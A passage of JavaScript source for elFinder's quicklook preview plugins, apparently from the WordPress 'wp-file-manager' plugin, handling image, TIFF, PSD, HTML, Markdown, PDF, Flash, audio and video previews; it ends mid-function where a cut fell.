elFinder.prototype.commands.quicklook.plugins = [
	
	/**
	 * Images preview plugin
	 *
	 * @param elFinder.commands.quicklook
	 **/
	function(ql) {
		"use strict";
		var mimes   = ['image/jpeg', 'image/png', 'image/gif', 'image/svg+xml', 'image/x-ms-bmp'],
			getDimSize = ql.fm.returnBytes((ql.options.getDimThreshold || 0)),
			preview = ql.preview,
			WebP, flipMime;
		
		// webp support
		WebP = new Image();
		WebP.onload = WebP.onerror = function() {
			if (WebP.height == 2) {
				mimes.push('image/webp');
			}
		};
		WebP.src='data:image/webp;base64,UklGRjoAAABXRUJQVlA4IC4AAACyAgCdASoCAAIALmk0mk0iIiIiIgBoSygABc6WWgAA/veff/0PP8bA//LwYAAA';
		
		// what kind of images we can display
		jQuery.each(navigator.mimeTypes, function(i, o) {
			var mime = o.type;
			
			if (mime.indexOf('image/') === 0 && jQuery.inArray(mime, mimes)) {
				mimes.push(mime);
			} 
		});
			
		preview.on(ql.evUpdate, function(e) {
			var fm   = ql.fm,
				file = e.file,
				showed = false,
				dimreq = null,
				setdim  = function(dim) {
					var rfile = fm.file(file.hash);
					rfile.width = dim[0];
					rfile.height = dim[1];
				},
				show = function() {
					var elm, varelm, memSize, width, height, prop;
					
					dimreq && dimreq.state && dimreq.state() === 'pending' && dimreq.reject();
					if (showed) {
						return;
					}
					showed = true;
					
					elm = img.get(0);
					memSize = file.width && file.height? {w: file.width, h: file.height} : (elm.naturalWidth? null : {w: img.width(), h: img.height()});
				
					memSize && img.removeAttr('width').removeAttr('height');
					
					width  = file.width || elm.naturalWidth || elm.width || img.width();
					height = file.height || elm.naturalHeight || elm.height || img.height();
					if (!file.width || !file.height) {
						setdim([width, height]);
					}
					
					memSize && img.width(memSize.w).height(memSize.h);

					prop = (width/height).toFixed(2);
					preview.on('changesize', function() {
						var pw = parseInt(preview.width()),
							ph = parseInt(preview.height()),
							w, h;
					
						if (prop < (pw/ph).toFixed(2)) {
							h = ph;
							w = Math.floor(h * prop);
						} else {
							w = pw;
							h = Math.floor(w/prop);
						}
						img.width(w).height(h).css('margin-top', h < ph ? Math.floor((ph - h)/2) : 0);
					
					})
					.trigger('changesize');
					
					//show image
					img.fadeIn(100);
				},
				hideInfo = function() {
					loading.remove();
					// hide info/icon
					ql.hideinfo();
				},
				url, img, loading, prog, m, opDfd;

			if (!flipMime) {
				flipMime = fm.arrayFlip(mimes);
			}
			if (flipMime[file.mime] && ql.dispInlineRegex.test(file.mime)) {
				// this is our file - stop event propagation
				e.stopImmediatePropagation();

				loading = jQuery('<div class="elfinder-quicklook-info-data"><span class="elfinder-spinner-text">'+fm.i18n('nowLoading')+'</span><span class="elfinder-spinner"></span></div>').appendTo(ql.info.find('.elfinder-quicklook-info'));
				prog = jQuery('<div class="elfinder-quicklook-info-progress"></div>').appendTo(loading);

				img = jQuery('<img/>')
					.hide()
					.appendTo(preview)
					.on('load', function() {
						hideInfo();
						show();
					})
					.on('error', function() {
						loading.remove();
					});
				opDfd = fm.openUrl(file.hash, false, function(url) {
					img.attr('src', url);
				}, { progressBar: prog });
				// stop loading on change file if not loaded yet
				preview.one('change', function() {
					opDfd && opDfd.state && opDfd.state() === 'pending' && opDfd.reject();
				});

				if (file.width && file.height) {
					show();
				} else if (file.size > getDimSize) {
					dimreq = fm.request({
						data : {cmd : 'dim', target : file.hash},
						preventDefault : true
					})
					.done(function(data) {
						if (data.dim) {
							var dim = data.dim.split('x');
							file.width = dim[0];
							file.height = dim[1];
							setdim(dim);
							show();
						}
					});
				}
			}
			
		});
	},
	
	/**
	 * TIFF image preview
	 *
	 * @param  object  ql  elFinder.commands.quicklook
	 */
	function(ql) {
		"use strict";
		var fm   = ql.fm,
			mime = 'image/tiff',
			preview = ql.preview;
		if (window.Worker && window.Uint8Array) {
			preview.on(ql.evUpdate, function(e) {
				var file = e.file,
					err = function(e) {
						wk && wk.terminate();
						loading.remove();
						fm.debug('error', e);
					},
					setdim = function(dim) {
						var rfile = fm.file(file.hash);
						rfile.width = dim[0];
						rfile.height = dim[1];
					},
					loading, prog, url, base, wk, opDfd;
				if (file.mime === mime) {
					e.stopImmediatePropagation();

					loading = jQuery('<div class="elfinder-quicklook-info-data"><span class="elfinder-spinner-text">'+fm.i18n('nowLoading')+'</span><span class="elfinder-spinner"></span></div>').appendTo(ql.info.find('.elfinder-quicklook-info'));
					prog = jQuery('<div class="elfinder-quicklook-info-progress"></div>').appendTo(loading);
					// stop loading on change file if not loaded yet
					preview.one('change', function() {
						wk && wk.terminate();
						loading.remove();
					});

					opDfd = fm.getContents(file.hash, 'arraybuffer', { progressBar: prog }).done(function(data) {
						if (data) {
							base = jQuery('<div></div>').css({width:'100%',height:'100%'}).hide().appendTo(preview);
							try {
								wk = fm.getWorker();
								wk.onmessage = function(res) {
									var data = res.data,
										cv, co, id, prop;
									wk && wk.terminate();
									cv = document.createElement('canvas');
									co = cv.getContext('2d');
									cv.width = data.width;
									cv.height = data.height;
									id = co.createImageData(data.width, data.height);
									(id).data.set(new Uint8Array(data.image));
									co.putImageData(id, 0, 0);
									base.append(cv).show();
									loading.remove();
									prop = (data.width/data.height).toFixed(2);
									preview.on('changesize', function() {
										var pw = parseInt(preview.width()),
											ph = parseInt(preview.height()),
											w, h;
										if (prop < (pw/ph).toFixed(2)) {
											h = ph;
											w = Math.floor(h * prop);
										} else {
											w = pw;
											h = Math.floor(w/prop);
										}
										jQuery(cv).width(w).height(h).css('margin-top', h < ph ? Math.floor((ph - h)/2) : 0);
									}).trigger('changesize');
									if (!file.width || !file.height) {
										setdim([data.width, data.height]);
									}
									ql.hideinfo();
								};
								wk.onerror = err;
								wk.postMessage({
									scripts: [fm.options.cdns.tiff, document.location.origin+'/wp-content/plugins/wp-file-manager/lib/js/worker/quicklook.tiff.js'],
									data: { data: data }
								});
							} catch(e) {
								err(e);
							}
						} else {
							err();
						}
					});
					// stop loading on change file if not loaded yet
					preview.one('change', function() {
						opDfd && opDfd.state && opDfd.state() === 'pending' && opDfd.reject();
					});
				}
			});
		}
	},

	/**
	 * PSD(Adobe Photoshop data) preview plugin
	 *
	 * @param elFinder.commands.quicklook
	 **/
	function(ql) {
		"use strict";
		var fm      = ql.fm,
			mimes   = fm.arrayFlip(['image/vnd.adobe.photoshop', 'image/x-photoshop']),
			preview = ql.preview,
			load    = function(url, img, loading) {
				try {
					fm.replaceXhrSend();
					PSD.fromURL(url).then(function(psd) {
						var prop;
						img.attr('src', psd.image.toBase64());
						requestAnimationFrame(function() {
							prop = (img.width()/img.height()).toFixed(2);
							preview.on('changesize', function() {
								var pw = parseInt(preview.width()),
									ph = parseInt(preview.height()),
									w, h;
							
								if (prop < (pw/ph).toFixed(2)) {
									h = ph;
									w = Math.floor(h * prop);
								} else {
									w = pw;
									h = Math.floor(w/prop);
								}
								img.width(w).height(h).css('margin-top', h < ph ? Math.floor((ph - h)/2) : 0);
							}).trigger('changesize');
							
							loading.remove();
							// hide info/icon
							ql.hideinfo();
							//show image
							img.fadeIn(100);
						});
					}, function() {
						loading.remove();
						img.remove();
					});
					fm.restoreXhrSend();
				} catch(e) {
					fm.restoreXhrSend();
					loading.remove();
					img.remove();
				}
			},
			PSD;
		
		preview.on(ql.evUpdate, function(e) {
			var file = e.file,
				url, img, loading, prog, m,
				_define, _require, opDfd;

			if (mimes[file.mime] && fm.options.cdns.psd && ! fm.UA.ltIE10 && ql.dispInlineRegex.test(file.mime)) {
				// this is our file - stop event propagation
				e.stopImmediatePropagation();

				loading = jQuery('<div class="elfinder-quicklook-info-data"><span class="elfinder-spinner-text">'+fm.i18n('nowLoading')+'</span><span class="elfinder-spinner"></span></div>').appendTo(ql.info.find('.elfinder-quicklook-info'));
				prog = jQuery('<div class="elfinder-quicklook-info-progress"></div>').appendTo(loading);
				opDfd = fm.openUrl(file.hash, 'sameorigin', function(url) {
					if (url) {
						img = jQuery('<img/>').hide().appendTo(preview);
						if (PSD) {
							load(url, img, loading);
						} else {
							_define = window.define;
							_require = window.require;
							window.require = null;
							window.define = null;
							fm.loadScript(
								[ fm.options.cdns.psd ],
								function() {
									PSD = require('psd');
									_define? (window.define = _define) : (delete window.define);
									_require? (window.require = _require) : (delete window.require);
									load(url, img, loading);
								}
							);
						}
					}
				}, { progressBar: prog });
				// stop loading on change file if not loaded yet
				preview.one('change', function() {
					opDfd && opDfd.state && opDfd.state() === 'pending' && opDfd.reject();
				});
			}
		});
	},
	
	/**
	 * HTML preview plugin
	 *
	 * @param elFinder.commands.quicklook
	 **/
	function(ql) {
		"use strict";
		var fm      = ql.fm,
			mimes   = fm.arrayFlip(['text/html', 'application/xhtml+xml']),
			preview = ql.preview;
			
		preview.on(ql.evUpdate, function(e) {
			var file = e.file, jqxhr, loading, prog;
			
			if (mimes[file.mime] && ql.dispInlineRegex.test(file.mime) && (!ql.options.getSizeMax || file.size <= ql.options.getSizeMax)) {
				e.stopImmediatePropagation();

				loading = jQuery('<div class="elfinder-quicklook-info-data"><span class="elfinder-spinner-text">'+fm.i18n('nowLoading')+'</span><span class="elfinder-spinner"></span></div>').appendTo(ql.info.find('.elfinder-quicklook-info'));
				prog = jQuery('<div class="elfinder-quicklook-info-progress"></div>').appendTo(loading);

				// stop loading on change file if not loaded yet
				preview.one('change', function() {
					jqxhr.state() == 'pending' && jqxhr.reject();
				}).addClass('elfinder-overflow-auto');
				
				jqxhr = fm.request({
					data           : {cmd : 'get', target : file.hash, conv : 1, _t : file.ts},
					options        : {type: 'get', cache : true},
					preventDefault : true,
					progressBar    : prog
				})
				.done(function(data) {
					ql.hideinfo();
					var doc = jQuery('<iframe class="elfinder-quicklook-preview-html"></iframe>').appendTo(preview)[0].contentWindow.document;
					doc.open();
					doc.write(data.content);
					doc.close();
				})
				.always(function() {
					loading.remove();
				});
			}
		});
	},
	
	/**
	 * MarkDown preview plugin
	 *
	 * @param elFinder.commands.quicklook
	 **/
	function(ql) {
		"use strict";
		var fm      = ql.fm,
			mimes   = fm.arrayFlip(['text/x-markdown']),
			preview = ql.preview,
			marked  = null,
			show = function(data, loading) {
				ql.hideinfo();
				var doc = jQuery('<iframe class="elfinder-quicklook-preview-html"></iframe>').appendTo(preview)[0].contentWindow.document;
				doc.open();
				doc.write(marked(data.content));
				doc.close();
				loading.remove();
			},
			error = function(loading) {
				marked = false;
				loading.remove();
			};
			
		preview.on(ql.evUpdate, function(e) {
			var file = e.file, jqxhr, loading, prog;
			
			if (mimes[file.mime] && fm.options.cdns.marked && marked !== false && ql.dispInlineRegex.test(file.mime) && (!ql.options.getSizeMax || file.size <= ql.options.getSizeMax)) {
				e.stopImmediatePropagation();

				loading = jQuery('<div class="elfinder-quicklook-info-data"><span class="elfinder-spinner-text">'+fm.i18n('nowLoading')+'</span><span class="elfinder-spinner"></span></div>').appendTo(ql.info.find('.elfinder-quicklook-info'));
				prog = jQuery('<div class="elfinder-quicklook-info-progress"></div>').appendTo(loading);

				// stop loading on change file if not loaded yet
				preview.one('change', function() {
					jqxhr.state() == 'pending' && jqxhr.reject();
				}).addClass('elfinder-overflow-auto');
				
				jqxhr = fm.request({
					data           : {cmd : 'get', target : file.hash, conv : 1, _t : file.ts},
					options        : {type: 'get', cache : true},
					preventDefault : true,
					progressBar    : prog
				})
				.done(function(data) {
					if (marked || window.marked) {
						if (!marked) {
							marked = window.marked;
						}
						show(data, loading);
					} else {
						fm.loadScript([fm.options.cdns.marked],
							function(res) { 
								marked = res || window.marked || false;
								delete window.marked;
								if (marked) {
									show(data, loading);
								} else {
									error(loading);
								}
							},
							{
								tryRequire: true,
								error: function() {
									error(loading);
								}
							}
						);
					}
				})
				.fail(function() {
					error(loading);
				});
			}
		});
	},

	/**
	 * PDF/ODT/ODS/ODP preview with ViewerJS
	 * 
	 * @param elFinder.commands.quicklook
	 */
	 function(ql) {
		if (ql.options.viewerjs) {
			var fm      = ql.fm,
				preview = ql.preview,
				opts    = ql.options.viewerjs,
				mimes   = opts.url? fm.arrayFlip(opts.mimes || []) : [],
				win     = ql.window,
				navi    = ql.navbar,
				setNavi = function() {
					navi.css('bottom', win.hasClass('elfinder-quicklook-fullscreen')? '30px' : '');
				};

			if (opts.url) {
				preview.on('update', function(e) {
					var file = e.file, node, loading, prog, opDfd;

					if (mimes[file.mime] && (file.mime !== 'application/pdf' || !opts.pdfNative || !ql.flags.pdfNative)) {
						e.stopImmediatePropagation();
						loading = jQuery('<div class="elfinder-quicklook-info-data"><span class="elfinder-spinner-text">'+fm.i18n('nowLoading')+'</span><span class="elfinder-spinner"></span></div>').appendTo(ql.info.find('.elfinder-quicklook-info'));
						prog = jQuery('<div class="elfinder-quicklook-info-progress"></div>').appendTo(loading);
						opDfd = fm.openUrl(file.hash, 'sameorigin', function(url) {
							if (url) {
								node = jQuery('<iframe class="elfinder-quicklook-preview-iframe"></iframe>')
									.css('background-color', 'transparent')
									.on('load', function() {
										ql.hideinfo();
										loading.remove();
										node.css('background-color', '#fff');
									})
									.on('error', function() {
										loading.remove();
										node.remove();
									})
									.appendTo(preview)
									.attr('src', opts.url + '#' + url);

								win.on('viewchange.viewerjs', setNavi);
								setNavi();

								preview.one('change', function() {
									win.off('viewchange.viewerjs');
									loading.remove();
									node.off('load').remove();
								});
							}
						}, { progressBar: prog });
						// stop loading on change file if not loaded yet
						preview.one('change', function() {
							opDfd && opDfd.state && opDfd.state() === 'pending' && opDfd.reject();
						});
					}
				});
			}
		}
	},

	/**
	 * PDF preview plugin
	 *
	 * @param elFinder.commands.quicklook
	 **/
	function(ql) {
		"use strict";
		var fm      = ql.fm,
			mime    = 'application/pdf',
			preview = ql.preview,
			active  = false,
			urlhash = '',
			firefox, toolbar;
			
		if ((fm.UA.Safari && fm.OS === 'mac' && !fm.UA.iOS) || fm.UA.IE || fm.UA.Firefox) {
			active = true;
		} else {
			jQuery.each(navigator.plugins, function(i, plugins) {
				jQuery.each(plugins, function(i, plugin) {
					if (plugin.type === mime) {
						return !(active = true);
					}
				});
			});
		}

		ql.flags.pdfNative = active;
		if (active) {
			if (typeof ql.options.pdfToolbar !== 'undefined' && !ql.options.pdfToolbar) {
				urlhash = '#toolbar=0';
			}
			preview.on(ql.evUpdate, function(e) {
				var file = e.file,
					opDfd;
				
				if (active && file.mime === mime && ql.dispInlineRegex.test(file.mime)) {
					e.stopImmediatePropagation();
					opDfd = fm.openUrl(file.hash, false, function(url) {
						if (url) {
							ql.hideinfo();
							ql.cover.addClass('elfinder-quicklook-coverbg');
							jQuery('<object class="elfinder-quicklook-preview-pdf" data="'+url+urlhash+'" type="application/pdf" ></object>')
								.on('error', function(e) {
									active = false;
									ql.update(void(0), fm.cwd());
									ql.update(void(0), file);
								})
								.appendTo(preview);
						}
					});
					// stop loading on change file if not loaded yet
					preview.one('change', function() {
						opDfd && opDfd.state && opDfd.state() === 'pending' && opDfd.reject();
					});
				}
				
			});
		}
	},
	
	/**
	 * Flash preview plugin
	 *
	 * @param elFinder.commands.quicklook
	 **/
	function(ql) {
		"use strict";
		var fm      = ql.fm,
			mime    = 'application/x-shockwave-flash',
			preview = ql.preview,
			active  = false;

		jQuery.each(navigator.plugins, function(i, plugins) {
			jQuery.each(plugins, function(i, plugin) {
				if (plugin.type === mime) {
					return !(active = true);
				}
			});
		});
		
		active && preview.on(ql.evUpdate, function(e) {
			var file = e.file,
				node, opDfd;
				
			if (file.mime === mime && ql.dispInlineRegex.test(file.mime)) {
				e.stopImmediatePropagation();
				opDfd = fm.openUrl(file.hash, false, function(url) {
					if (url) {
						ql.hideinfo();
						node = jQuery('<embed class="elfinder-quicklook-preview-flash" pluginspage="http://www.macromedia.com/go/getflashplayer" src="'+url+'" quality="high" type="application/x-shockwave-flash" wmode="transparent" />')
							.appendTo(preview);
					}
				});
				// stop loading on change file if not loaded yet
				preview.one('change', function() {
					opDfd && opDfd.state && opDfd.state() === 'pending' && opDfd.reject();
				});
			}
		});
	},
	
	/**
	 * HTML5 audio preview plugin
	 *
	 * @param elFinder.commands.quicklook
	 **/
	function(ql) {
		"use strict";
		var fm       = ql.fm,
			preview  = ql.preview,
			mimes    = {
				'audio/mpeg'    : 'mp3',
				'audio/mpeg3'   : 'mp3',
				'audio/mp3'     : 'mp3',
				'audio/x-mpeg3' : 'mp3',
				'audio/x-mp3'   : 'mp3',
				'audio/x-wav'   : 'wav',
				'audio/wav'     : 'wav',
				'audio/x-m4a'   : 'm4a',
				'audio/aac'     : 'm4a',
				'audio/mp4'     : 'm4a',
				'audio/x-mp4'   : 'm4a',
				'audio/ogg'     : 'ogg',
				'audio/webm'    : 'webm',
				'audio/flac'    : 'flac',
				'audio/x-flac'  : 'flac',
				'audio/amr'     : 'amr'
			},
			node, curHash,
			win  = ql.window,
			navi = ql.navbar,
			AMR, autoplay,
			controlsList = typeof ql.options.mediaControlsList === 'string' && ql.options.mediaControlsList? ' controlsList="' + fm.escape(ql.options.mediaControlsList) + '"' : '',
			setNavi = function() {
				navi.css('bottom', win.hasClass('elfinder-quicklook-fullscreen')? '50px' : '');
			},
			getNode = function(src, hash) {
				return jQuery('<audio class="elfinder-quicklook-preview-audio ui-front" controls' + controlsList + ' preload="auto" autobuffer><source src="'+src+'" ></source></audio>')
					.on('change', function(e) {
						// Firefox fire change event on seek or volume change
						e.stopPropagation();
					})
					.on('error', function(e) {
						node && node.data('hash') === hash && reset();
					})
					.data('hash', hash)
					.appendTo(preview);
			},
			amrToWavUrl = function(hash) {
				var dfd = jQuery.Deferred(),
					loader = jQuery.Deferred().done(function() {
						var opDfd;
						opDfd = fm.getContents(hash, 'arraybuffer', { progressBar: prog }).done(function(data) {
							try {
								var buffer = AMR.toWAV(new Uint8Array(data));
								if (buffer) {
									dfd.resolve(URL.createObjectURL(new Blob([buffer], { type: 'audio/x-wav' })));
								} else {
									dfd.reject();
								}
							} catch(e) {
								dfd.reject();
							}
						}).fail(function() {
							dfd.reject();
						});
						// stop loading on change file if not loaded yet
						preview.one('change', function() {
							opDfd && opDfd.state && opDfd.state() === 'pending' && opDfd.reject();
						});
					}).fail(function() {
						AMR = false;
						dfd.reject();
					}),
					_AMR;
				if (window.TextEncoder && window.URL && URL.createObjectURL && typeof AMR === 'undefined') {
					// previous window.AMR
					_AMR = window.AMR;
					delete window.AMR;
					fm.loadScript(
						[ fm.options.cdns.amr ],
						function() { 
							AMR = window.AMR? window.AMR : false;
							// restore previous window.AMR
							window.AMR = _AMR;
							loader[AMR? 'resolve':'reject']();
						},
						{
							error: function() {
								loader.reject();
							}
						}
					);
				} else {
					loader[AMR? 'resolve':'reject']();
				}
				return dfd;
			},
			play = function(player) {
				var hash = node.data('hash'),
					playPromise;
				autoplay && (playPromise = player.play());
				// uses "playPromise['catch']" instead "playPromise.catch" to support Old IE
				if (playPromise && playPromise['catch']) {
					playPromise['catch'](function(e) {
						if (!player.paused) {
							node && node.data('hash') === hash && reset();
						}
					});
				}
			},
			reset = function() {
				if (node && node.parent().length) {
					var elm = node[0],
						url = node.children('source').attr('src');
					win.off('viewchange.audio');
					try {
						elm.pause();
						node.empty();
						if (url.match(/^blob:/)) {
							URL.revokeObjectURL(url);
						}
						elm.src = '';
						elm.load();
					} catch(e) {}
					node.remove();
					node = null;
				}
			},
			loading, prog;

		preview.on(ql.evUpdate, function(e) {
			var file = e.file,
				type = mimes[file.mime],
				html5, opDfd;

			if (mimes[file.mime] && ql.dispInlineRegex.test(file.mime) && ((html5 = ql.support.audio[type]) || (type === 'amr'))) {
				autoplay = ql.autoPlay();
				curHash = file.hash;
				if (!html5) {
					if (fm.options.cdns.amr && type === 'amr' && AMR !== false) {
						e.stopImmediatePropagation();
						loading = jQuery('<div class="elfinder-quicklook-info-data"><span class="elfinder-spinner-text">'+fm.i18n('nowLoading')+'</span><span class="elfinder-spinner"></span></div>').appendTo(ql.info.find('.elfinder-quicklook-info'));
						prog = jQuery('<div class="elfinder-quicklook-info-progress"></div>').appendTo(loading);
						node = getNode('', curHash);
						amrToWavUrl(file.hash).done(function(url) {
							loading.remove();
							if (curHash === file.hash) {
								var elm = node[0];
								try {
									node.children('source').attr('src', url);
									elm.pause();
									elm.load();
									play(elm);
									win.on('viewchange.audio', setNavi);
									setNavi();
								} catch(e) {
									URL.revokeObjectURL(url);
									node.remove();
								}
							} else {
								URL.revokeObjectURL(url);
							}
						}).fail(function() {
							node.remove();
						});
					}
				} else {
					e.stopImmediatePropagation();
					loading = jQuery('<div class="elfinder-quicklook-info-data"><span class="elfinder-spinner-text">'+fm.i18n('nowLoading')+'</span><span class="elfinder-spinner"></span></div>').appendTo(ql.info.find('.elfinder-quicklook-info'));
					prog = jQuery('<div class="elfinder-quicklook-info-progress"></div>').appendTo(loading);
					opDfd = fm.openUrl(curHash, false, function(url) {
						loading.remove();
						if (url) {
							node = getNode(url, curHash);
							play(node[0]);
							win.on('viewchange.audio', setNavi);
							setNavi();
						} else {
							node.remove();
						}
					}, { progressBar: prog });
					// stop loading on change file if not loaded yet
					preview.one('change', function() {
						opDfd && opDfd.state && opDfd.state() === 'pending' && opDfd.reject();
					});
				}
			}
		}).one('change', reset);
	},
	
	/**
	 * HTML5 video preview plugin
	 *
	 * @param elFinder.commands.quicklook
	 **/
	function(ql) {
		"use strict";
		var fm       = ql.fm,
			preview  = ql.preview,
			mimes    = {
				'video/mp4'       : 'mp4',
				'video/x-m4v'     : 'mp4',
				'video/quicktime' : 'mp4',
				'video/mpeg'      : 'mpeg',
				'video/ogg'       : 'ogg',
				'application/ogg' : 'ogg',
				'video/webm'      : 'webm',
				'video/x-matroska': 'mkv',
				'video/3gpp'      : '3gp',
				'application/vnd.apple.mpegurl' : 'm3u8',
				'application/x-mpegurl' : 'm3u8',
				'application/dash+xml'  : 'mpd',
				'video/x-flv'     : 'flv',
				'video/x-msvideo' : 'avi'
			},
			node,
			win  = ql.window,
			navi = ql.navbar,
			cHls, cDash, pDash, cFlv, cVideojs, autoplay, tm, loading, prog,
			controlsList = typeof ql.options.mediaControlsList === 'string' && ql.options.mediaControlsList? ' controlsList="' + fm.escape(ql.options.mediaControlsList) + '"' : '',
			setNavi = function() {
				if (fm.UA.iOS) {
					if (win.hasClass('elfinder-quicklook-fullscreen')) {
						preview.css('height', '-webkit-calc(100% - 50px)');
						navi._show();
					} else {
						preview.css('height', '');
					}
				} else {
					navi.css('bottom', win.hasClass('elfinder-quicklook-fullscreen')? '50px' : '');
				}
			},
			render = function(file, opts) {
				var errTm = function(e) {
						if (err > 1) {
							tm && clearTimeout(tm);
							tm = setTimeout(function() {
								!canPlay && reset(true);
							}, 800);
						}
					},
					err = 0, 
					canPlay;
				//reset();
				pDash = null;
				opts = opts || {};
				ql.hideinfo();
				node = jQuery('<video class="elfinder-quicklook-preview-video" controls' + controlsList + ' preload="auto" autobuffer playsinline>'
						+'</video>')
					.on('change', function(e) {
						// Firefox fire change event on seek or volume change
						e.stopPropagation();
					})
					.on('timeupdate progress', errTm)
					.on('canplay', function() {
						canPlay = true;
					})
					.data('hash', file.hash);
				// can not handling error event with jQuery `on` event handler
				node[0].addEventListener('error', function(e) {
					if (opts.src && fm.convAbsUrl(opts.src) === fm.convAbsUrl(e.target.src)) {
						++err;
						errTm();
					}
				}, true);

				if (opts.src) {
					node.append('<source src="'+opts.src+'" type="'+file.mime+'"></source><source src="'+opts.src+'"></source>');
				}
				
				node.appendTo(preview);

				win.on('viewchange.video', setNavi);
				setNavi();
			},
			loadHls = function(file) {
				var hls, opDfd;
				opDfd = fm.openUrl(file.hash, false, function(url) {
					loading.remove();
					if (url) {
						render(file);
						hls = new cHls();
						hls.loadSource(url);
						hls.attachMedia(node[0]);
						if (autoplay) {
							hls.on(cHls.Events.MANIFEST_PARSED, function() {
								play(node[0]);
							});
						}
					}
				}, { progressBar: prog });
				// stop loading on change file if not loaded yet
				preview.one('change', function() {
					opDfd && opDfd.state && opDfd.state() === 'pending' && opDfd.reject();
				});
			},
			loadDash = function(file) {
				var opDfd;
				opDfd = fm.openUrl(file.hash, false, function(url) {
					var debug;
					loading.remove();
					if (url) {
						render(file);
						pDash = window.dashjs.MediaPlayer().create();
						debug = pDash.getDebug();
						if (debug.setLogLevel) {
							debug.setLogLevel(dashjs.Debug.LOG_LEVEL_FATAL);
						} else if (debug.setLogToBrowserConsole) {
							debug.setLogToBrowserConsole(false);
						}
						pDash.initialize(node[0], url, autoplay);
						pDash.on('error', function(e) {
							reset(true);
						});
					}
				}, { progressBar: prog });
				// stop loading on change file if not loaded yet
				preview.one('change', function() {
					opDfd && opDfd.state && opDfd.state() === 'pending' && opDfd.reject();
				});
			},
			loadFlv = function(file) {
				var opDfd
				if (!cFlv.isSupported()) {
					cFlv = false;
					return;
				}
				opDfd = fm.openUrl(file.hash, false, function(url) {
					loading.remove();
					if (url) {
						var player = cFlv.createPlayer({
							type: 'flv',
							url: url
						});
						render(file);
						player.on(cFlv.Events.ERROR, function() {
							player.destroy();
							reset(true);
						});
						player.attachMediaElement(node[0]);
						player.load();
						play(player);
					}
				}, { progressBar: prog });
				// stop loading on change file if not loaded yet
				preview.one('change', function() {
					opDfd && opDfd.state && opDfd.state() === 'pending' && opDfd.reject();
				});
			},
			loadVideojs = function(file) {
				var opDfd;
				opDfd = fm.openUrl(file.hash, false, function(url) {
					loading.remove();
					if (url) {
						render(file);
						node[0].src = url;
						cVideojs(node[0], {
							src: url
						});
					}
				}, { progressBar: prog });
				// stop loading on change file if not loaded yet
				preview.one('change', function() {
					opDfd && opDfd.state && opDfd.state() === 'pending' && opDfd.reject();
				});
			},
			play = function(player) {
				var hash = node.data('hash'),
					playPromise;
				autoplay && (playPromise = player.play());
				// uses "playPromise['catch']" instead "playPromise.catch" to support Old IE
				if (playPromise && playPromise['catch']) {
					playPromise['catch'](function(e) {
						if (!player.paused) {
							node && node.data('hash') === hash && reset(true);
						}
					});
				}
			},
			reset = function(showInfo) {
				tm && clearTimeout(tm);
				if (node && node.parent().length) {
					var elm = node[0];
					win.off('viewchange.video');
					pDash && pDash.reset();
					try {
						elm.pause();
						node.empty();
						elm.src = '';
						elm.load();
					} catch(e) {}
					node.remove();
					node = null;
				}
				showInfo && ql.info.show();
			};

		preview.on(ql.evUpdate, function(e) {
			var file = e.file,
				mime = file.mime.toLowerCase(),
				type = mimes[mime],
				stock, playPromise, opDfd;
			
			if (mimes[mime] && ql.dispInlineRegex.test(file.mime) /*&& (((type === 'm3u8' || (type === 'mpd' && !fm.UA.iOS) || type === 'flv') && !fm.UA.ltIE10) || ql.support.video[type])*/) {
				autoplay = ql.autoPlay();
				loading = jQuery('<div class="elfinder-quicklook-info-data"><span class="elfinder-spinner-text">'+fm.i18n('nowLoading')+'</span><span class="elfinder-spinner"></span></div>');
				prog = jQuery('<div class="elfinder-quicklook-info-progress"></div>').appendTo(loading);
				if (ql.support.video[type] && (type !== 'm3u8' || fm.UA.Safari)) {
					e.stopImmediatePropagation();
					loading.appendTo(ql.info.find('.elfinder-quicklook-info'));
					opDfd = fm.openUrl(file.hash, false, function(url) {
						loading.remove();
						if (url) {
							render(file, { src: url });
							play(node[0]);
						}
					}, { progressBar: prog });
					// stop loading on change file if not loaded yet
					preview.one('change', function() {
						opDfd && opDfd.state && opDfd.state() === 'pending' && opDfd.reject();
					});
				} else {
					if (cHls !== false && fm.options.cdns.hls && type === 'm3u8') {
						e.stopImmediatePropagation();
						loading.appendTo(ql.info.find('.elfinder-quicklook-info'));
						if (cHls) {
							loadHls(file);
						} else {
							stock = window.Hls;
							delete window.Hls;
							fm.loadScript(
								[ fm.options.cdns.hls ],
								function(res) { 
									cHls = res || window.Hls || false;
									window.Hls = stock;
									cHls && loadHls(file);
								},
								{
									tryRequire: true,
									error : function() {
										cHls = false;
									}
								}
							);
						}
					} else if (cDash !== false && fm.options.cdns.dash && type === 'mpd') {
						e.stopImmediatePropagation();
						loading.appendTo(ql.info.find('.elfinder-quicklook-info'));
						if (cDash) {
							loadDash(file);
						} else {
							fm.loadScript(
								[ fm.options.cdns.dash ],
								function() {
									// dashjs require window.dashjs in global scope
									cDash = window.dashjs? true : false;
									cDash && loadDash(file);
								},
								{
									tryRequire: true,
									error : function() {
										cDash = false;
									}
								}
							);
						}
					} else if (cFlv !== false && fm.options.cdns.flv && type === 'flv') {
						e.stopImmediatePropagation();
						loading.appendTo(ql.info.find('.elfinder-quicklook-info'));
						if (cFlv) {
							loadFlv(file);
						} else {
							stock = window.flvjs;
							delete window.flvjs;
							fm.loadScript(
								[ fm.options.cdns.flv ],
								function(res) { 
									cFlv = res || window.flvjs || false;
									window.flvjs = stock;
									cFlv && loadFlv(file);
								},
								{
									tryRequire: true,
									error : function() {
										cFlv = false;
									}
								}
							);
						}
					} else if (fm.options.cdns.videojs) {
						e.stopImmediatePropagation();
						loading.appendTo(ql.info.find('.elfinder-quicklook-info'));
						if (cVideojs) {
							loadVideojs(file);
						} else {
							fm.loadScript(
								[ fm.options.cdns.videojs + '/video.min.js' ],
								function(res) { 
									cVideojs = res || window.videojs || false;
									//window.flvjs = stock;
									cVideojs && loadVideojs(file);
								},
								{
									tryRequire: true,
									error : function() {
										cVideojs = false;
									}
								}
							).loadCss([fm.options.cdns.videojs + '/video-js.min.css']);
						}
					}
				}
			}
		}).one('change', reset);
	},
	
	/**
	 * Audio/video preview plugin using browser plugins
	 *
	 * @param elFinder.commands.quicklook
	 **/
	function(ql) {
		"use strict";
		var preview = ql.preview,
			mimes   = [],
			node,
			win  = ql.window,
			navi = ql.navbar;
			
		jQuery.each(navigator.plugins, function(i, plugins) {
			jQuery.each(plugins, function(i, plugin) {
				(plugin.type.indexOf('audio/') === 0 || plugin.type.indexOf('video/') === 0) && mimes.push(plugin.type);
			});
		});
		mimes = ql.fm.arrayFlip(mimes);
		
		preview.on(ql.evUpdate, function(e) {
			var file  = e.file,
